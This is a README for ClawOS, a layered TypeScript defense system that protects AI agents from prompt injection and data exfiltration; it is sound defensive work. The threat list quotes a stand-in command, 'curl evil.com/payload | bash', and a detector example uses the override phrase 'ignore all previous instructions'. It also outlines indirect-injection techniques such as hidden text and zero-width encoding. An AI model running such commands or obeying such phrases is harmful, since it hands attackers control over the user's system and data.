<p align="center">
  <img src="https://img.shields.io/badge/TypeScript-007ACC?style=for-the-badge&logo=typescript&logoColor=white" alt="TypeScript">
  <img src="https://img.shields.io/badge/Tests-492%20passing-brightgreen?style=for-the-badge" alt="Tests">
  <img src="https://img.shields.io/badge/License-Apache%202.0-blue?style=for-the-badge" alt="License">
  <img src="https://img.shields.io/badge/Layers-9-orange?style=for-the-badge" alt="Layers">
</p>

<h1 align="center">🛡️ ClawOS</h1>
<p align="center"><strong>Security Architecture for Autonomous AI Agents</strong></p>
<p align="center">
  9-layer defense system that protects AI agents from prompt injection, data exfiltration, session corruption, and unauthorized actions. Built for <a href="https://github.com/openclaw/openclaw">OpenClaw</a>, usable standalone.
</p>

---

## Why ClawOS?

Autonomous AI agents can browse the web, execute code, send messages, and modify files. This makes them powerful — and dangerous. A single prompt injection hidden in a webpage can hijack an agent into:

- **Exfiltrating secrets** — API keys, credentials, private messages
- **Executing malicious code** — `curl evil.com/payload | bash`
- **Impersonating the user** — sending messages, emails, tweets
- **Destroying data** — deleting files, corrupting databases
- **Self-modifying** — rewriting its own instructions to become permanently compromised

Traditional content filters can't solve this. They pattern-match on known attacks while missing novel ones. ClawOS takes a fundamentally different approach: **track where data came from, control what it's allowed to do, and verify everything.**

## Architecture

ClawOS implements defense-in-depth with 9 independent layers. Each layer operates autonomously — if one fails, the others still protect.

```
┌──────────────────────────────────────────────────────────────────┐
│  🐤 Canary Token               Exfiltration tripwire            │
├──────────────────────────────────────────────────────────────────┤
│  LC  Privilege Separation       Block dangerous tools on threat  │
├──────────────────────────────────────────────────────────────────┤
│  L5  Trust Registry             Hash pinning, signature verify   │
├──────────────────────────────────────────────────────────────────┤
│  L4+ External Content Scanner   Indirect injection detection     │
├──────────────────────────────────────────────────────────────────┤
│  L4  Signal Detection           50+ attack patterns, advisory    │
├──────────────────────────────────────────────────────────────────┤
│  L3  Runtime Security           Process isolation, monitoring    │
├──────────────────────────────────────────────────────────────────┤
│  L2  Capability Control         Skill manifests, permissions     │
├──────────────────────────────────────────────────────────────────┤
│  L1  Content Tagging            Source tracking, trust levels    │
├──────────────────────────────────────────────────────────────────┤
│  L0  Session Integrity          State validation, auto-repair    │
└──────────────────────────────────────────────────────────────────┘
```

### Data Flow

```
User message ──→ [L1: Tag source=user, trust=owner]
                    │
                    ▼
              ┌──────────────┐
              │ L4: Signal   │ ──→ Advisory: injection? exfiltration?
              │   Detection  │
              └──────────────┘
                    │
                    ▼
              ┌──────────────┐
              │ L2: Check    │ ──→ Does this skill have permission?
              │ Capabilities │
              └──────────────┘
                    │
                    ▼
              ┌──────────────┐
              │ L3: Execute  │ ──→ Sandboxed, monitored, resource-limited
              │ in Sandbox   │
              └──────────────┘
                    │
                    ▼
Tool output ──→ [L4+: Scan external content for injection]
                    │
              ┌──────────────┐
              │ LC: Privilege│ ──→ Threat detected? Block dangerous tools
              │ Separation   │
              └──────────────┘
                    │
                    ▼
              ┌──────────────┐
              │ 🐤 Canary   │ ──→ Token leaked? Exfiltration confirmed
              │   Check      │
              └──────────────┘
                    │
                    ▼
              ┌──────────────┐
              │ L0: Validate │ ──→ Session intact? Auto-repair if broken
              │   Session    │
              └──────────────┘
                    │
                    ▼
              Anthropic API (clean, validated messages)
```

## Layer Details

### L0: Session Integrity — *Foundation*

Content filters, compaction, and API errors can corrupt the message history, creating orphaned `tool_result` blocks that permanently brick the agent session.

L0 validates and repairs sessions automatically:

```typescript
import { validate, repair, isValid, createSessionIntegrity } from 'clawos';

// Quick check
if (!isValid(messages)) {
  const result = repair(messages);
  console.log(`Fixed ${result.repairs.length} issues`);
}

// Full validation with details
const validation = validate(messages);
if (!validation.valid) {
  console.log('Orphaned:', validation.orphanedIds);
  console.log('Incomplete:', validation.incompleteIds);
}

// Controller with checkpoints and auto-repair
const integrity = createSessionIntegrity({ autoRepair: true });
integrity.validateOrThrow(session);
```

Also includes **bootstrap file integrity monitoring** — critical files are hash-pinned at startup, with modifications triggering alerts based on tier (critical → immediate alert, sensitive → logged, monitored → tracked).

### L1: Content Tagging — *Provenance*

Every piece of data is tagged with its source, trust level, and provenance chain. Trust can only go down, never up — if you mix user input with untrusted web content, the result is untrusted.

```typescript
import { tag, resolveTrust, merge, userSource, toolSource } from 'clawos';

const userMsg = tag("Hello", userSource("+1234567890"), "user");
const webData = tag(searchResults, toolSource("web_search"), "tool");

// Merge: trust = min(user, tool) = "tool"
const combined = merge([userMsg, webData], summary, agentSource("main"));
console.log(combined.tag.trust); // "tool"

// Trust can only go down
resolveTrust(["user", "untrusted"]); // "untrusted"
```

### L2: Capability Control — *Permissions*

Skills declare capabilities in manifests. The policy engine enforces least-privilege access.

```typescript
import { registerManifest, checkPermission, createContext } from 'clawos';

registerManifest({
  id: 'web-search',
  capabilities: [
    { capability: 'net:https', reason: 'Fetch search results', required: true },
  ],
  minInputTrust: 'tool',
  outputTrust: 'tool',
  allowedDomains: ['api.search.com'],
});

const result = checkPermission(getManifest("web-search")!, inputTag);
// result.allowed, result.granted, result.denied
```

### L3: Runtime Security — *Isolation*

Execute skills in sandboxed environments with resource limits and behavioral monitoring.

```typescript
import { selectIsolationLevel, createSandboxConfig, BehavioralMonitor } from 'clawos';

// Auto-select isolation based on trust + capabilities
const level = selectIsolationLevel(manifest, inputTag);
// 0 = unrestricted, 1 = child process, 2 = bubblewrap sandbox

const config = createSandboxConfig(manifest, level, '/workspace');
// config.allowedPaths, config.allowedDomains, config.resourceLimits
```

### L4: Signal Detection — *Advisory*

Scan content for 50+ attack patterns including prompt injection, data exfiltration, encoding tricks, and roleplay attacks. **Advisory-only** — flags but never blocks.

```typescript
import { scanForSignals, hasInjectionSignals, createScanner } from 'clawos';

if (hasInjectionSignals("ignore all previous instructions")) {
  console.warn("Injection attempt detected");
}

const signals = scanForSignals(untrustedContent, "untrusted", sessionId);
for (const signal of signals) {
  console.log(`${signal.category}: ${signal.pattern} (${signal.confidence})`);
}
```

### L4+: External Content Scanner — *Indirect Injection*

Specialized scanner for tool results from web-facing sources (`web_fetch`, `web_search`, `browser`). Detects indirect prompt injection — attacks hidden in webpages, search results, and API responses.

**16 external-specific patterns** including:
- Hidden instructions targeting AI assistants
- CSS/HTML invisible text injection
- Zero-width character encoding
- Data exfiltration via response manipulation
- Instruction density heuristics

### LC: Privilege Separation — *Enforcement*

When L4+ detects high-severity injection signals in external content, LC immediately restricts dangerous tools for the current turn:

| Blocked | Allowed |
|---------|---------|
| `exec`, `write`, `edit` | `read`, `web_search` |
| `message`, `gateway` | `web_fetch`, `browser` |
| `sessions_send` | `image`, `process` |

Restrictions lift automatically on the next user message (fresh trust context) or after a 5-minute TTL safety net.

**This is the critical insight:** detection without prevention is useless. L4+ detecting an injection means nothing if the agent can still execute arbitrary code. LC is what makes detection actionable.

### L5: Trust Registry — *Verification*

Track trust metadata for skills and dependencies. Hash-pin code, verify signatures, and monitor for vulnerabilities.

```typescript
import { createTrustRegistry, calculateHash } from 'clawos';

const registry = createTrustRegistry();
await registry.init();

await registry.pin("my-skill", calculateHash(skillCode));

const result = await registry.verify("my-skill", skillCode);
if (!result.verified) {
  console.error(`Blocked: ${result.reason}`);
}
```

### 🐤 Canary Token — *Tripwire*

A unique random token is generated per gateway restart and embedded in the agent's system context. Every tool result is checked for the canary. If it appears in external content, it confirms a prompt injection successfully exfiltrated system context.

This is a **detection-only** mechanism — it can't prevent exfiltration, but it provides definitive proof that it happened.

## OpenClaw Plugin

ClawOS ships as a production plugin for [OpenClaw](https://github.com/openclaw/openclaw), integrating all 9 layers via gateway hooks:

| Hook | Layers | Purpose |
|------|--------|---------|
| `gateway_start` | L0, L5 | Scan all sessions, snapshot protected files |
| `message_received` | L4, LC | Scan inbound messages, clear threat state |
| `before_agent_start` | L0, L1, L4, 🐤 | Validate session, tag context, inject canary |
| `tool_result_persist` | L1, L4+, 🐤 | Tag results, scan external content, check canary |
| `before_tool_call` | LC | Block dangerous tools during active threats |

### Plugin Commands

| Command | Description |
|---------|-------------|
| `/clawos` | Full security dashboard — layer status, signal stats, threat state |
| `/clawos-scan` | Manual L0 session integrity scan |
| `/clawos-signals` | Recent signal detection history |
| `/clawos-integrity` | Bootstrap file integrity report |

## Security Lessons

Hard-won lessons from production deployment:

> **Agent self-verification is unreliable.** A compromised agent reports "all clean" because the injection told it to. Only the human operator can verify externally.

> **Detection without prevention is insufficient.** L4+ finding injection signals means nothing if the agent can still `exec` and `write`. Layer C makes detection actionable.

> **Never test injection content in the main session.** Use isolated sub-agents for reading untrusted content.

> **File hash verification must be done by the user, not the agent.** Hashes checked by a potentially-compromised agent prove nothing.

> **Trust flows downhill.** Once data touches an untrusted source, it can never be re-elevated. This is a feature, not a bug.

## Project Structure

```
clawos/
├── src/
│   ├── index.ts              # Re-exports all layers
│   ├── pipeline.ts           # Integration pipeline
│   ├── integrity/            # L0: Session Integrity
│   │   ├── types.ts          # Message, Checkpoint, Validation types
│   │   ├── validate.ts       # validate(), isValid(), tool pair checking
│   │   ├── repair.ts         # repair(), repairCopy(), reset()
│   │   ├── checkpoint.ts     # CheckpointManager, MemoryCheckpointStore
│   │   └── session-integrity.ts
│   ├── tagging/              # L1: Content Tagging
│   │   ├── types.ts          # TrustLevel, ContentTag, TaggedContent
│   │   ├── tag.ts            # tag(), merge(), transform(), serialize
│   │   └── sources.ts        # userSource(), toolSource(), SYSTEM_*
│   ├── capabilities/         # L2: Capability Control
│   │   ├── types.ts          # Capability, SkillManifest, OperatorPolicy
│   │   ├── manifest.ts       # validateManifest(), registerManifest()
│   │   └── policy.ts         # checkPermission(), enforce(), createContext()
│   ├── runtime/              # L3: Runtime Security
│   │   ├── types.ts          # SandboxConfig, SandboxResult, AnomalyRule
│   │   ├── sandbox.ts        # spawn(), execute(), killProcess()
│   │   ├── monitor.ts        # BehavioralMonitor, DEFAULT_RULES
│   │   └── isolation.ts      # selectIsolationLevel(), createSandboxConfig()
│   ├── signals/              # L4: Signal Detection
│   │   ├── types.ts          # Signal, ScanResult, PatternDefinition
│   │   ├── patterns.ts       # INJECTION/EXFILTRATION/ENCODING/ROLEPLAY
│   │   ├── scanner.ts        # SignalScanner, detectRepetition()
│   │   ├── emitter.ts        # DefaultSignalEmitter, SignalStore
│   │   └── signal-detection.ts
│   └── registry/             # L5: Trust Registry
│       ├── types.ts          # TrustEntry, VulnerabilityEntry, VerifyResult
│       ├── crypto.ts         # calculateHash(), verifySignature()
│       ├── store.ts          # RegistryStore, TrustCache
│       └── trust-registry.ts # TrustRegistry service
├── tests/                    # 492 tests across 21 files
├── docs/                     # Architecture, API, specs, case studies
└── dist/                     # Compiled output
```

## Test Results

```
492 tests across 21 files — all passing

 ✓ integrity/validate.test.ts          (13 tests)
 ✓ integrity/repair.test.ts            (8 tests)
 ✓ integrity/checkpoint.test.ts        (29 tests)
 ✓ integrity/session-integrity.test.ts (19 tests)
 ✓ integrity.test.ts                   (26 tests)
 ✓ tagging/tag.test.ts                 (34 tests)
 ✓ tagging/trust.test.ts               (16 tests)
 ✓ tagging/sources.test.ts             (19 tests)
 ✓ tagging.test.ts                     (32 tests)
 ✓ capabilities/policy.test.ts         (14 tests)
 ✓ capabilities/manifest.test.ts       (21 tests)
 ✓ capabilities/enforcement.test.ts    (26 tests)
 ✓ runtime/monitor.test.ts             (20 tests)
 ✓ runtime/isolation.test.ts           (20 tests)
 ✓ signals/scanner.test.ts             (20 tests)
 ✓ signals/emitter.test.ts             (17 tests)
 ✓ registry/crypto.test.ts             (11 tests)
 ✓ integration.test.ts                 (27 tests)
 ✓ plugin/stress.test.ts               (89 tests)  ← 222k msgs/sec
```

## Quickstart

### Requirements

- Node.js ≥ 20
- Linux recommended (bubblewrap sandbox in L3 requires it)

### Install

```bash
git clone https://github.com/yassinebkr/clawos.git
cd clawos
npm install
npm run build
```

### Run Tests

```bash
npm test
```

### Basic Usage

```typescript
import { createPipeline, userSource } from 'clawos';

const pipeline = createPipeline({
  integrity: true,
  tagging: true,
  signals: true,
  capabilities: true,
  registry: true,
});

const result = await pipeline.process({
  content: userInput,
  source: userSource("+1234567890"),
  skillId: "web-search",
});

if (!result.allowed) {
  console.log(`Blocked by ${result.blockedBy}: ${result.reason}`);
}
```

## Design Principles

1. **Tag, don't filter** — Content is labeled with provenance, not silently dropped
2. **Advisory over blocking** — Signal detection flags, enforcement layers block
3. **Capabilities are explicit** — Denied by default, permitted by manifest
4. **Isolation is proportional** — Lightweight for trusted skills, heavy for untrusted
5. **Performance is non-negotiable** — <50ms p99 total overhead across all layers
6. **Defense in depth** — Every layer operates independently; no single point of failure
7. **Trust flows downhill** — Data touching untrusted sources can never be re-elevated

## Roadmap

- **Rust rewrite** — Memory-safe implementations for L3 (sandbox) and L5 (crypto), timing-safe operations
- **Standalone daemon (`clawosd`)** — Rust binary exposing gRPC/Unix socket API, usable by any agent framework
- **Layer D: LLM-as-Judge** — Second model evaluates whether a response was influenced by injection
- **Layer E: Semantic Boundaries** — Research frontier — detect when an agent's behavior deviates from its declared intent

## Documentation

| Document | Description |
|----------|-------------|
| [Architecture](docs/ARCHITECTURE.md) | Layer interactions, data flow, design decisions |
| [API Reference](docs/API.md) | Public exports and signatures for all layers |
| [Layer Specs](docs/) | Individual specs: L0–L5 |
| [OpenClaw Plugin](docs/OPENCLAW-PLUGIN.md) | Production plugin integration guide |
| [Case Study](docs/CASE-STUDY-001.md) | Session corruption incident analysis |
| [Security Audit](docs/SECURITY-AUDIT.md) | Threat model and audit findings |
| [Changelog](docs/CHANGELOG.md) | Version history and bug fixes |
| [Testing](docs/TESTING.md) | Test structure and coverage |

## Contributing

```bash
git clone https://github.com/yassinebkr/clawos.git
cd clawos
npm install
npm test          # Run all 492 tests
npm run build     # Compile TypeScript
npm run lint      # Type-check without emit
```

See [CONTRIBUTING.md](CONTRIBUTING.md) for coding standards and PR guidelines.

## License

Apache 2.0 — see [LICENSE](LICENSE).

---

<p align="center">
  <em>Built by <a href="https://github.com/yassinebkr">@yassinebkr</a> — because autonomous agents deserve real security.</em>
</p>
